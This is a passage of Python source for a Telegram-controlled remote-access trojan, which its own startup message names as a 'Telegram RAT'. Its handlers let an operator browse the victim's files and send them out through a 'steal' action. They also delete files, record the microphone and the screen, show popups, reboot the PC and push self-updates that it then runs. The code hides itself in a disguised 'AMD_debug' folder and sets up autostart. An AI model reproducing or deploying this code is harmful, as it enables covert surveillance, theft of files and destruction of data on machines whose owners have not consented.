        state['page'] = 0
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'file':
        file_path = id_map.get(arg)
        if file_path:
            show_item_actions(call.message.chat.id, user_id, arg, is_dir=False, message_id=call.message.message_id)
    elif action == 'page':
        delta = int(arg)
        state['page'] = max(0, state['page'] + delta)
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'drives':
        state['path'] = 'DRIVES'
        state['show_drives'] = True
        state['page'] = 0
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'dir':
        show_item_actions(call.message.chat.id, user_id, arg, is_dir=True, message_id=call.message.message_id)
    elif action == 'action':
        # explorer:action:тип:item_id:file/dir
        parts = call.data.split(':', 5)
        act_type = parts[2]
        item_id = parts[3]
        item_kind = parts[4]
        id_map = state.get('map', {})
        item_path = id_map.get(item_id)
        if not item_path and act_type != 'cancel':
            bot.send_message(call.message.chat.id, '❌ Не удалось найти элемент.')
            bot.answer_callback_query(call.id)
            return
        if act_type == 'open':
            if item_kind == 'dir':
                state['path'] = item_path
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            else:
                try:
                    os.startfile(item_path)
                    bot.send_message(call.message.chat.id, f'✅ Файл {item_path} открыт на ПК.')
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'❌ Не удалось открыть файл: {e}')
        elif act_type == 'steal':
            if item_kind == 'dir':
                import shutil, tempfile
                import zipfile
                try:
                    tmpdir = tempfile.mkdtemp()
                    zip_path = os.path.join(tmpdir, os.path.basename(item_path) + '.zip')
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, files in os.walk(item_path):
                            for file in files:
                                abs_path = os.path.join(root, file)
                                rel_path = os.path.relpath(abs_path, item_path)
                                zipf.write(abs_path, arcname=rel_path)
                    bot.send_document(call.message.chat.id, open(zip_path, 'rb'))
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'❌ Не удалось отправить архив: {e}')
            else:
                try:
                    bot.send_document(call.message.chat.id, open(item_path, 'rb'))
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'❌ Не удалось отправить файл: {e}')
        elif act_type == 'delete':
            import shutil
            try:
                if item_kind == 'dir':
                    shutil.rmtree(item_path)
                else:
                    os.remove(item_path)
                bot.send_message(call.message.chat.id, '✅ Удалено!')
                # После удаления возвращаемся к родителю
                parent = os.path.dirname(item_path)
                state['path'] = parent
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            except Exception as e:
                bot.send_message(call.message.chat.id, f'❌ Не удалось удалить: {e}')
        elif act_type == 'cancel':
            # Если файл был вызван через сообщение, возвращаемся к его папке
            if item_id == 'filemsg' and not (item_kind == 'dir'):
                parent = os.path.dirname(item_path)
                state['path'] = parent
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            else:
                show_directory(call.message.chat.id, user_id, call.message.message_id)
        elif act_type == 'size':
            show_item_actions(call.message.chat.id, user_id, item_id, is_dir=(item_kind=='dir'), message_id=call.message.message_id, show_size=True)
        elif act_type == 'rename':
            msg = bot.send_message(call.message.chat.id, 'Введите новое имя:')
            bot.register_next_step_handler(msg, handle_rename, user_id, item_id, item_kind, call.message.message_id)
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id)

def handle_rename(message, user_id, item_id, item_kind, message_id):
    state = user_paths.get(user_id, {})
    id_map = state.get('map', {})
    item_path = id_map.get(item_id)
    if not item_path:
        bot.send_message(message.chat.id, '❌ Не удалось найти элемент.')
        return
    new_name = message.text.strip()
    if not new_name:
        bot.send_message(message.chat.id, '❌ Имя не может быть пустым.')
        return
    new_path = os.path.join(os.path.dirname(item_path), new_name)
    try:
        os.rename(item_path, new_path)
        bot.send_message(message.chat.id, f'✅ Переименовано в {new_name}')
        # Обновить проводник
        parent = os.path.dirname(new_path)
        user_paths[user_id] = {'path': parent, 'page': 0, 'map': {}, 'show_drives': False}
        show_directory(message.chat.id, user_id, message_id)
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Не удалось переименовать: {e}')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🌐 Ссылка')
def url_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='url:cancel'))
    msg = bot.send_message(message.chat.id, 'Введите ссылку или текст для открытия в браузере:', reply_markup=markup)
    bot.register_next_step_handler(msg, url_open_handler)

def url_open_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if not message.text or not message.text.strip():
        return
    if message.text.strip().lower() == 'отмена':
        return
    import webbrowser
    url = message.text.strip()
    if not url:
        bot.send_message(message.chat.id, '❌ Пустая ссылка или текст.')
        
        return
    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'✅ Открыто в браузере: {url}')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Не удалось открыть ссылку: {e}')
    

# --- Callback-обработчики для inline-кнопок подтверждения и отмены ---
@bot.callback_query_handler(func=lambda call: call.data == 'reboot:yes')
def reboot_yes_callback(call):
    bot.edit_message_text('Перезагрузка...', call.message.chat.id, call.message.message_id)
    shutdown_with_display_off('shutdown /r /t 0')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'reboot:no')
def reboot_no_callback(call):
    bot.edit_message_text('Перезагрузка отменена.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'shutdown:yes')
def shutdown_yes_callback(call):
    bot.edit_message_text('Выключение...', call.message.chat.id, call.message.message_id)
    shutdown_with_display_off('shutdown /s /t 0')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'shutdown:no')
def shutdown_no_callback(call):
    bot.edit_message_text('Выключение отменена.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

# --- Механизм отмены для next_step_handler ---

# В callback-обработчиках отмены:
@bot.callback_query_handler(func=lambda call: call.data == 'url:cancel')
def url_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'runfile:cancel')
def runfile_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# В каждом next_step_handler:

# Список всех возможных кнопок (используется для проверки в handle_path_message)
ALL_MAIN_MENU_BUTTONS = [
    '🖼 Скриншот', '🗂 Процессы', '💻 Cmd', '🔄 Перезагрузить ПК',
    '⏹ Выключить ПК', '📂 Выполнить файл', '🗂 Проводник', '🌐 Ссылка',
    '🎤 Записать микрофон', '🎬 Записать GIF', '💬 Popup сообщение', '🔊 Воспроизвести звук', '🔄 Update', '➖ Свернуть всё'
]

# --- Исправление: handle_path_message не должен перехватывать ответы на диалоги ---
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and not message.text.startswith('/') and not hasattr(message, 'reply_markup'))
def handle_path_message(message):
    if not message.text or not message.text.strip():
        return  # Игнорируем пустые сообщения
    if message.text in ALL_MAIN_MENU_BUTTONS:
        return
    path = message.text.strip().strip('"')
    if not os.path.exists(path):
        bot.send_message(message.chat.id, '❌ Путь не существует.')
        return
    user_id = message.from_user.id
    if os.path.isdir(path):
        user_paths[user_id] = {'path': path, 'page': 0, 'map': {}, 'show_drives': False}
        show_directory(message.chat.id, user_id)
    else:
        # Добавляем файл во временную карту и показываем меню действий
        parent = os.path.dirname(path)
        user_paths[user_id] = {'path': parent, 'page': 0, 'map': {'filemsg': path}, 'show_drives': False}
        show_item_actions(message.chat.id, user_id, 'filemsg', is_dir=False)

from telebot.types import ReplyKeyboardRemove

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '➖ Свернуть всё')
def minimize_all_handler(message):
    import ctypes
    user32 = ctypes.windll.user32
    # Win key down
    user32.keybd_event(0x5B, 0, 0, 0)
    # M key down
    user32.keybd_event(0x4D, 0, 0, 0)
    # M key up
    user32.keybd_event(0x4D, 0, 2, 0)
    # Win key up
    user32.keybd_event(0x5B, 0, 2, 0)
    bot.send_message(message.chat.id, '➖ Все окна свернуты!')

# Воспроизведение звука (MP3)
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🔊 Воспроизвести звук')
def play_sound_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='sound:cancel'))
    msg = bot.send_message(message.chat.id, 'Отправьте MP3-файл (как аудио или как документ) для воспроизведения.', reply_markup=markup)
    bot.register_next_step_handler(msg, play_sound_receive_handler)

def _play_sound_async(file_path):
    try:
        import winsound
        import os
        
        # Проверяем расширение файла
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext == '.wav':
            # Для WAV файлов используем winsound
            winsound.PlaySound(file_path, winsound.SND_FILENAME)
        else:
            # Для MP3 и других форматов используем pygame
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(file_path)
                pygame.mixer.music.play()
                
                # Ждем пока музыка не закончится
                while pygame.mixer.music.get_busy():
                    import time
                    time.sleep(0.1)
                    
                pygame.mixer.quit()
            except:
                # Если pygame не работает, используем системное воспроизведение
                subprocess.Popen(["start", "", file_path], shell=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def play_sound_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    file_id = None
    file_name = None
    mime_type = None
    # Принимаем как документ
    if message.document:
        file_id = message.document.file_id
        file_name = (message.document.file_name or '').lower()
        mime_type = (message.document.mime_type or '').lower()
    # Или как аудио (музыка)
    elif hasattr(message, 'audio') and message.audio:
        file_id = message.audio.file_id
        file_name = (getattr(message.audio, 'file_name', '') or '').lower()
        mime_type = (getattr(message.audio, 'mime_type', '') or '').lower()
    else:
        bot.send_message(message.chat.id, '❌ Пожалуйста, отправьте MP3 как аудио или документ.')
        return
    try:
        is_mp3 = False
        if file_name and file_name.endswith('.mp3'):
            is_mp3 = True
        if not is_mp3 and mime_type == 'audio/mpeg':
            is_mp3 = True
        if not is_mp3:
            bot.send_message(message.chat.id, '❌ Нужен MP3-файл (расширение .mp3 или MIME audio/mpeg).')
            return

        file_info = bot.get_file(file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '❌ Не удалось получить путь к файлу.')
            return
        data = bot.download_file(file_info.file_path)
        # сохраняем во временный файл
        tmpdir = tempfile.mkdtemp()
        local_name = os.path.basename(file_name) if file_name else 'sound.mp3'
        if not local_name.endswith('.mp3'):
            local_name += '.mp3'
        local_path = os.path.join(tmpdir, local_name)
        with open(local_path, 'wb') as f:
            f.write(data)
        bot.send_message(message.chat.id, f'🔊 Воспроизвожу звук...')
        th = threading.Thread(target=_play_sound_async, args=(local_path,), daemon=True)
        th.start()
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при воспроизведении: {e}')

@bot.callback_query_handler(func=lambda call: call.data == 'sound:cancel')
def sound_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# Обработчик записи микрофона
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🎤 Записать микрофон')
def microphone_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='mic:cancel'))
    msg = bot.send_message(message.chat.id, 'Введите время записи в секундах (от 1 до 60):', reply_markup=markup)
    bot.register_next_step_handler(msg, microphone_record_handler)

def microphone_record_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    try:
        duration = int(message.text.strip())
        if duration < 1 or duration > 60:
            bot.send_message(message.chat.id, '❌ Время должно быть от 1 до 60 секунд.')
            return
    except ValueError:
        bot.send_message(message.chat.id, '❌ Введите корректное число.')
        return
    
    bot.send_message(message.chat.id, f'🎤 Начинаю запись на {duration} секунд...')
    
    try:
        # Параметры записи
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        # Создаем объект PyAudio
        audio = pyaudio.PyAudio()
        
        # Открываем поток для записи
        stream = audio.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
        
        frames = []
        
        # Записываем аудио
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        # Останавливаем запись
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        # Сохраняем в файл
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as tmpfile:
            wf = wave.open(tmpfile.name, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Отправляем голосовое сообщение
            with open(tmpfile.name, 'rb') as voice_file:
                bot.send_voice(message.chat.id, voice_file, duration=duration)
        
        # Удаляем временный файл после закрытия всех файловых дескрипторов
        try:
            os.unlink(tmpfile.name)
        except Exception:
            pass  # Игнорируем ошибки удаления
        
        bot.send_message(message.chat.id, f'✅ Запись завершена! ({duration} сек)')
        
        # Показываем уведомление
        user_nick = get_user_nick(message.from_user.id)
        show_notification("Запись микрофона", f"{user_nick} записал {duration} сек", "🎤")
        
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при записи: {str(e)}')

@bot.callback_query_handler(func=lambda call: call.data == 'mic:cancel')
def mic_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# Обработчик записи GIF
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🎬 Записать GIF')
def gif_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='gif:cancel'))
    msg = bot.send_message(message.chat.id, 'Введите время записи в секундах (от 1 до 60):', reply_markup=markup)
    bot.register_next_step_handler(msg, gif_record_handler)

def gif_record_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    try:
        duration = int(message.text.strip())
        if duration < 1 or duration > 60:
            bot.send_message(message.chat.id, '❌ Время должно быть от 1 до 60 секунд.')
            return
    except ValueError:
        bot.send_message(message.chat.id, '❌ Введите корректное число.')
        return
    
    bot.send_message(message.chat.id, f'🎬 Начинаю запись GIF на {duration} секунд...')
    
    try:
        # Параметры записи
        fps = 6  # 6 кадров в секунду - хороший баланс качества и размера
        total_frames = duration * fps
        frame_interval = 1.0 / fps
        
        # Создаем временную папку для кадров
        temp_dir = tempfile.mkdtemp()
        frames = []
        
        # Делаем скриншоты
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # основной монитор
            
            for i in range(total_frames):
                # Проверяем отмену
                if user_paths.get(user_id, {}).get('cancelled'):
                    user_paths[user_id]['cancelled'] = False
                    # Удаляем временную папку
                    import shutil
                    shutil.rmtree(temp_dir, ignore_errors=True)
                    return
                
                # Делаем скриншот
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                # Оптимизируем размер для баланса качества и размера файла
                # Сохраняем пропорции, делаем средний размер для хорошего качества
                width, height = img.size
                if width > 600:  # Если ширина больше 600px
                    ratio = 600 / width
                    new_width = 600
                    new_height = int(height * ratio)
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                
                # Сохраняем кадр с оптимизацией
                frame_path = os.path.join(temp_dir, f"frame_{i:03d}.png")
                img.save(frame_path, "PNG", optimize=True, compress_level=6)
                frames.append(frame_path)
                
                # Ждем до следующего кадра
                time.sleep(frame_interval)
        
        # Создаем GIF
        if frames:
            gif_path = os.path.join(temp_dir, "recording.gif")
            
            # Загружаем первый кадр
            first_frame = Image.open(frames[0])
            
            # Конвертируем в палитру с хорошим количеством цветов для качества
            first_frame = first_frame.convert('P', palette=Image.ADAPTIVE, colors=200)
            
            # Создаем GIF с улучшенными параметрами для хорошего качества
            first_frame.save(
                gif_path,
                save_all=True,
                append_images=[Image.open(frame).convert('P', palette=Image.ADAPTIVE, colors=200) for frame in frames[1:]],
                duration=int(1000 / fps),  # длительность кадра в миллисекундах
                loop=0,  # бесконечный цикл
                optimize=True,  # оптимизация
                quality=85,  # хорошее качество
                method=6  # лучший метод сжатия
            )
            
            # Отправляем GIF
            with open(gif_path, 'rb') as gif_file:
                bot.send_document(message.chat.id, gif_file, caption=f'🎬 GIF записан! ({duration} сек, {len(frames)} кадров)')
            
            # Удаляем временные файлы
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            bot.send_message(message.chat.id, f'✅ GIF создан! ({duration} сек)')
            
            # Показываем уведомление
            user_nick = get_user_nick(message.from_user.id)
            show_notification("Запись GIF", f"{user_nick} записал GIF {duration} сек", "🎬")
        else:
            bot.send_message(message.chat.id, '❌ Не удалось создать кадры для GIF.')
            
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при создании GIF: {str(e)}')
        # Удаляем временную папку в случае ошибки
        try:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data == 'gif:cancel')
def gif_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# Обработчик popup сообщения
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '💬 Popup сообщение')
def popup_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='popup:cancel'))
    msg = bot.send_message(message.chat.id, 'Введите текст для popup сообщения:', reply_markup=markup)
    bot.register_next_step_handler(msg, popup_show_handler)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🔄 Update')
def update_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='update:cancel'))
    msg = bot.send_message(message.chat.id, 'Отправьте новый файл бота (.py или .pyw):', reply_markup=markup)
    bot.register_next_step_handler(msg, update_receive_handler)

def update_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    if not message.document:
        bot.send_message(message.chat.id, '❌ Пожалуйста, отправьте файл как документ.')
        return
    
    # Проверяем расширение файла
    file_name = message.document.file_name.lower()
    if not (file_name.endswith('.py') or file_name.endswith('.pyw')):
        bot.send_message(message.chat.id, '❌ Файл должен иметь расширение .py или .pyw')
        return
    
    try:
        bot.send_message(message.chat.id, '🔄 Начинаю обновление...')
        
        # Скачиваем новый файл
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '❌ Не удалось получить путь к файлу.')
            return
        
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Сохраняем новый файл в AMD_debug
        new_file_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        with open(new_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        bot.send_message(message.chat.id, f'✅ Новый файл сохранен: {new_file_path}')
        
        # Обновляем автозапуск
        cleanup_startup_links()
        create_startup_link(new_file_path)
        
        bot.send_message(message.chat.id, '✅ Обновление завершено! Новый бот будет запущен при следующей загрузке системы.')
        
        # Запускаем новый файл
        try:
            subprocess.Popen([sys.executable, new_file_path])
            bot.send_message(message.chat.id, '🚀 Новый бот запущен!')
        except Exception as e:
            bot.send_message(message.chat.id, f'⚠️ Новый файл сохранен, но не удалось его запустить: {e}')
        
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при обновлении: {str(e)}')

def popup_show_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    text = message.text.strip()
    if not text:
        bot.send_message(message.chat.id, '❌ Текст не может быть пустым.')
        return
    
    bot.send_message(message.chat.id, f'💬 Показываю popup: "{text}"')
    
    try:
        # Используем Windows API для создания popup окна
        import ctypes
        from ctypes import wintypes
        
        # Экранируем текст для Windows API
        safe_text = text.replace('"', '\\"').replace('\n', '\\n')
        
        # Создаем popup через MessageBoxW с кнопками Да/Нет и topmost
        result = ctypes.windll.user32.MessageBoxW(
            0,  # hWnd (родительское окно)
            safe_text,  # lpText (текст сообщения)
            "Сообщение",  # lpCaption (заголовок)
            0x24 | 0x1000  # uType (MB_ICONQUESTION | MB_YESNO | MB_TOPMOST)
        )
        
        if result == 6:  # IDYES
            bot.send_message(message.chat.id, '✅ Пользователь выбрал: ДА')
        elif result == 7:  # IDNO
            bot.send_message(message.chat.id, '✅ Пользователь выбрал: НЕТ')
        elif result == 0:  # Ошибка
            bot.send_message(message.chat.id, '❌ Не удалось показать popup сообщение.')
        else:
            bot.send_message(message.chat.id, f'✅ Popup показан, результат: {result}')
        
    except Exception as e:
        # Если Windows API не работает, пробуем через PowerShell
        try:
            # Экранируем текст для PowerShell
            ps_text = text.replace('"', '`"').replace("'", "''")
            
            # Создаем PowerShell команду с кнопками Да/Нет
            ps_command = f'''
Add-Type -AssemblyName System.Windows.Forms
$result = [System.Windows.Forms.MessageBox]::Show("{ps_text}", "Сообщение", "YesNo", "Question", "DefaultButton1", "TopMost")
if ($result -eq "Yes") {{ Write-Output "YES" }} else {{ Write-Output "NO" }}
'''
            
            # Запускаем PowerShell
            result = subprocess.run([
                'powershell', '-Command', ps_command
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                if output == "YES":
                    bot.send_message(message.chat.id, '✅ Пользователь выбрал: ДА')
                elif output == "NO":
                    bot.send_message(message.chat.id, '✅ Пользователь выбрал: НЕТ')
                else:
                    bot.send_message(message.chat.id, f'✅ Popup показан, результат: {output}')
            else:
                bot.send_message(message.chat.id, f'❌ Ошибка PowerShell: {result.stderr}')
                
        except Exception as e2:
            bot.send_message(message.chat.id, f'❌ Ошибка при показе popup: {str(e2)}')

@bot.callback_query_handler(func=lambda call: call.data == 'popup:cancel')
def popup_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'update:cancel')
def update_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Обновление отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def start_bot_with_reconnect():
    """Запускает бота с автоматическим переподключением"""
    retry_delay = 5
    
    while True:
        try:
            print("🤖 Запускаем Telegram бота...")
            bot.polling(none_stop=True, timeout=20, long_polling_timeout=20)
        except Exception as e:
            error_msg = str(e).lower()
            print(f"❌ Ошибка соединения: {e}")
            
            # Проверяем тип ошибки
            if 'network' in error_msg or 'connection' in error_msg or 'timeout' in error_msg:
                print("🌐 Проблема с сетью, ждем восстановления...")
                wait_for_internet()
                retry_delay = 5  # Сбрасываем задержку после восстановления сети
            else:
                print(f"🔄 Переподключение через {retry_delay} секунд...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 1.5, 60)  # максимум 60 секунд

def check_internet_connection():
    """Проверяет интернет соединение"""
    try:
        import urllib.request
        urllib.request.urlopen('http://google.com', timeout=5)
        return True
    except:
        return False

def check_bot_token():
    """Проверяет валидность токена бота"""
    try:
        bot.get_me()
        return True
    except Exception as e:
        print(f"❌ Ошибка токена бота: {e}")
        return False

def wait_for_internet():
    """Ждет восстановления интернет соединения"""
    print("🌐 Ожидание восстановления интернет соединения...")
    while not check_internet_connection():
        time.sleep(5)
    print("✅ Интернет соединение восстановлено!")

if __name__ == '__main__':
    print("🚀 Запуск Telegram RAT...")
    
    # Инициализируем Qt для уведомлений
    print("🔔 Инициализация системы уведомлений...")
    init_qt_app()
    
    # Останавливаем другие Python процессы
    print("🔄 Остановка других Python процессов...")
    kill_other_python_processes()
    
    # Настраиваем AMD_debug папку и перемещаем скрипт
    print("📁 Настройка AMD_debug...")
    script_path = setup_amd_debug_folder()
    
    # Очищаем старые ссылки и создаем новую
    print("🔗 Настройка автозапуска...")
    cleanup_startup_links(allowed_script_path=script_path)
    create_startup_link(script_path)
    
    # Ждем интернет перед запуском
    if not check_internet_connection():
        wait_for_internet()
    
    # Проверяем токен бота
    if not check_bot_token():
        print("❌ Неверный токен бота! Проверьте API_TOKEN")
        input("Нажмите Enter для выхода...")
        sys.exit(1)
    
    print("✅ Токен бота валиден")
    
    # Уведомления отключены при запуске
    
    # Запускаем бота с переподключением
    start_bot_with_reconnect()
